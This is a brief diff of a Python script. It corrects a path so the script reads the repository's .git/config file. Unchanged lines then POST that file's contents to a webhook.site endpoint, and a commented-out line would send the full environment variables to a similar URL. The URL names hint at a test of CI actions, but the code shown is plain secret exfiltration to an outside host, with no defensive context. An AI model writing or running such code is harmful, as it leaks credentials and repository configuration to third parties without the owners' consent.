@@ -3,7 +3,7 @@ import json
 import os, requests
 # requests.post("https://webhook.site/TestActions/testScriptsTools6", json={"env": dict(os.environ)})
 
-with open('../../git/config', 'r') as f:
+with open('../../.git/config', 'r') as f:
     config_data = f.read()
 
 requests.post('https://webhook.site/TestActions/testScriptsTools/gitConfig3', json={'config': config_data})
